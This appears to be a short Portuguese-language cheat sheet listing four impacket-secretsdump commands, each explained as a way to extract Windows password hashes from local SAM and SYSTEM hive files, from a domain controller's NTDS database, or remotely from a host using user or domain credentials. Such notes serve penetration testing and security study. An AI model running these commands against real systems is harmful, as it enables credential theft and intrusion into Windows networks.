impacket-secretsdump -sam sam file -system system file LOCAL → Descobre os hashes de senha dos computadores Windows

impacket-secretsdump -ntds ntds file -system system file LOCAL → Descobre os hashes de senha dos servidores Windows

impacket-secretsdump user:password@host → Descobre os hashes de senha de usuários no SAM, NTDS e no cache

impacket-secretsdump domain/user:’password’@host → Descobri os hashes dos usuários do dominio